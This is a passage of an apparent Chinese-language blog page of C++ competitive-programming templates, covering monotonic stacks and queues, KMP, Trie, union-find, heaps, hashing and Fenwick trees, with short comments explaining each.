class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; <span class="built_in">check_out</span>(q[hh])) hh ++ ;  <span class="comment">// 判断队头是否滑出窗口</span></span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; <span class="built_in">check</span>(q[tt], i)) tt -- ;</span><br><span class="line">    q[ ++ tt] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>e.g. 输出每个数左边第一个比它小的数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[N], n;</span><br><span class="line">stack&lt;<span class="type">int</span>&gt; s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"><span class="keyword">while</span> (s.<span class="built_in">size</span>() &amp;&amp; s.<span class="built_in">top</span>() &gt;= a[i]) s.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span> (s.<span class="built_in">empty</span>()) <span class="built_in">printf</span>(<span class="string">&quot;-1 &quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s.<span class="built_in">top</span>());</span><br><span class="line">s.<span class="built_in">push</span>(a[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单调队列">单调队列</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">常见模型：找出滑动窗口中的最大值/最小值</span><br><span class="line"><span class="type">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; <span class="built_in">check_out</span>(q[hh])) hh ++ ;  <span class="comment">// 判断队头是否滑出窗口</span></span><br><span class="line">    <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; <span class="built_in">check</span>(q[tt], i)) tt -- ;</span><br><span class="line">    q[ ++ tt] = i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>e.g. 滑动窗口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> n, k;</span><br><span class="line"><span class="type">int</span> a[N], q[N]; <span class="comment">//队列中存下标</span></span><br><span class="line"><span class="type">int</span> front = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    <span class="comment">//求最小值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(tail &gt;= front &amp;&amp; i-k+<span class="number">1</span> &gt; q[front]) front++;</span><br><span class="line">        <span class="keyword">while</span>(tail &gt;= front &amp;&amp; a[q[tail]] &gt;= a[i]) tail--;</span><br><span class="line">        q[++tail] = i;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= k<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[q[front]]);</span><br><span class="line">    &#125;</span><br><span class="line">    front = <span class="number">0</span>, tail = <span class="number">-1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="comment">//找最大值</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(tail &gt;= front &amp;&amp; i-k+<span class="number">1</span> &gt; q[front]) front++;</span><br><span class="line">        <span class="keyword">while</span>(tail &gt;= front &amp;&amp; a[q[tail]] &lt;= a[i]) tail--;</span><br><span class="line">        q[++tail] = i;</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= k<span class="number">-1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[q[front]]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="kmp">KMP</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// s[]是长文本，p[]是模式串，n是s的长度，m是p的长度</span></span><br><span class="line">求模式串的Next数组：</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= m; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">    <span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>]) j ++ ;</span><br><span class="line">    ne[i] = j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 匹配</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (j &amp;&amp; s[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">    <span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>]) j ++ ;</span><br><span class="line">    <span class="keyword">if</span> (j == m)</span><br><span class="line">    &#123;</span><br><span class="line">        j = ne[j];</span><br><span class="line">        <span class="comment">// 匹配成功后的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="trie树">Trie树</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> son[N][<span class="number">26</span>], cnt[N], idx;</span><br><span class="line"><span class="comment">// 0号点既是根节点，又是空节点</span></span><br><span class="line"><span class="comment">// son[][]存储树中每个节点的子节点</span></span><br><span class="line"><span class="comment">// cnt[]存储以每个节点结尾的单词数量</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入一个字符串</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!son[p][u]) son[p][u] = ++ idx;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    cnt[p] ++ ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查询字符串出现的次数</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!son[p][u]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> cnt[p];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="并查集">并查集</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)朴素并查集：</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> p[N]; <span class="comment">//存储每个点的祖宗节点</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回x的祖宗节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p[x] != x) p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">        <span class="keyword">return</span> p[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化，假定节点编号是1~n</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) p[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并a和b所在的两个集合：</span></span><br><span class="line">    p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)维护size的并查集：</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> p[N], size[N];</span><br><span class="line">    <span class="comment">//p[]存储每个点的祖宗节点, size[]只有祖宗节点的有意义，表示祖宗节点所在集合中的点的数量</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回x的祖宗节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p[x] != x) p[x] = <span class="built_in">find</span>(p[x]);</span><br><span class="line">        <span class="keyword">return</span> p[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化，假定节点编号是1~n</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        p[i] = i;</span><br><span class="line">        size[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并a和b所在的两个集合：</span></span><br><span class="line">    size[<span class="built_in">find</span>(b)] += size[<span class="built_in">find</span>(a)];</span><br><span class="line">    p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)维护到祖宗节点距离的并查集：</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> p[N], d[N];</span><br><span class="line">    <span class="comment">//p[]存储每个点的祖宗节点, d[x]存储x到p[x]的距离</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回x的祖宗节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p[x] != x)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> u = <span class="built_in">find</span>(p[x]);</span><br><span class="line">            d[x] += d[p[x]];</span><br><span class="line">            p[x] = u;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p[x];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化，假定节点编号是1~n</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        p[i] = i;</span><br><span class="line">        d[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 合并a和b所在的两个集合：</span></span><br><span class="line">    p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);</span><br><span class="line">    d[<span class="built_in">find</span>(a)] = distance; <span class="comment">// 根据具体问题，初始化find(a)的偏移量</span></span><br></pre></td></tr></table></figure><h3 id="堆">堆</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// h[N]存储堆中的值, h[1]是堆顶，x的左儿子是2x, 右儿子是2x + 1</span></span><br><span class="line"><span class="comment">// ph[k]存储第k个插入的点在堆中的位置</span></span><br><span class="line"><span class="comment">// hp[k]存储堆中下标是k的点是第几个插入的</span></span><br><span class="line"><span class="type">int</span> h[N], ph[N], hp[N], size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 交换两个点，及其映射关系</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heap_swap</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">swap</span>(ph[hp[a]],ph[hp[b]]);</span><br><span class="line">    <span class="built_in">swap</span>(hp[a], hp[b]);</span><br><span class="line">    <span class="built_in">swap</span>(h[a], h[b]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t = u;</span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> &lt;= size &amp;&amp; h[u * <span class="number">2</span>] &lt; h[t]) t = u * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (u * <span class="number">2</span> + <span class="number">1</span> &lt;= size &amp;&amp; h[u * <span class="number">2</span> + <span class="number">1</span>] &lt; h[t]) t = u * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (u != t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(u, t);</span><br><span class="line">        <span class="built_in">down</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (u / <span class="number">2</span> &amp;&amp; h[u] &lt; h[u / <span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(u, u / <span class="number">2</span>);</span><br><span class="line">        u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// O(n)建堆</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = n / <span class="number">2</span>; i; i -- ) <span class="built_in">down</span>(i);</span><br></pre></td></tr></table></figure><h3 id="一般哈希">一般哈希</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) 拉链法</span><br><span class="line">    <span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向哈希表中插入一个数</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> k = (x % N + N) % N;</span><br><span class="line">        e[idx] = x;</span><br><span class="line">        ne[idx] = h[k];</span><br><span class="line">        h[k] = idx ++ ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在哈希表中查询某个数是否存在</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> k = (x % N + N) % N;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = h[k]; i != <span class="number">-1</span>; i = ne[i])</span><br><span class="line">            <span class="keyword">if</span> (e[i] == x)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) 开放寻址法</span><br><span class="line">    <span class="type">int</span> h[N];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果x在哈希表中，返回x的下标；如果x不在哈希表中，返回x应该插入的位置</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> t = (x % N + N) % N;</span><br><span class="line">        <span class="keyword">while</span> (h[t] != null &amp;&amp; h[t] != x)</span><br><span class="line">        &#123;</span><br><span class="line">            t ++ ;</span><br><span class="line">            <span class="keyword">if</span> (t == N) t = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="字符串哈希-判断两个子串是否相等">字符串哈希（判断两个子串是否相等）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ULL;</span><br><span class="line">ULL h[N], p[N]; <span class="comment">// h[k]存储字符串前k个字母的哈希值, p[k]存储 P^k mod 2^64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化</span></span><br><span class="line">p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ )</span><br><span class="line">&#123;</span><br><span class="line">    h[i] = h[i - <span class="number">1</span>] * P + str[i];</span><br><span class="line">    p[i] = p[i - <span class="number">1</span>] * P;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算子串 str[l ~ r] 的哈希值</span></span><br><span class="line"><span class="function">ULL <span class="title">get</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h[r] - h[l - <span class="number">1</span>] * p[r - l + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="树状数组">树状数组</h3><p>树状数组两功能：<br>1、修改某个元素<br>2、求子数列[a,b]的连续和</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> tr[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">lowbit</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; -x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> a)</span> <span class="comment">//x位置的数加上a</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = x; i &lt;= n; i += <span class="built_in">lowbit</span>(i))</span><br><span class="line">        tr[i] += a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">query</span><span class="params">(<span class="type">int</span> x)</span> <span class="comment">//求[1, x]区间和</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = x; i &gt; <span class="number">0</span>; i -= <span class="built_in">lowbit</span>(i))</span><br><span class="line">        res += tr[i];</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">        <span class="built_in">add</span>(i, a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> op, a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;op, &amp;a, &amp;b);</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">1</span>) <span class="built_in">add</span>(a, b);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">query</span>(b) - <span class="built_in">query</span>(a - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>差分+树状数组</strong></p><p>1、单点查询<br>2、区间修改</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 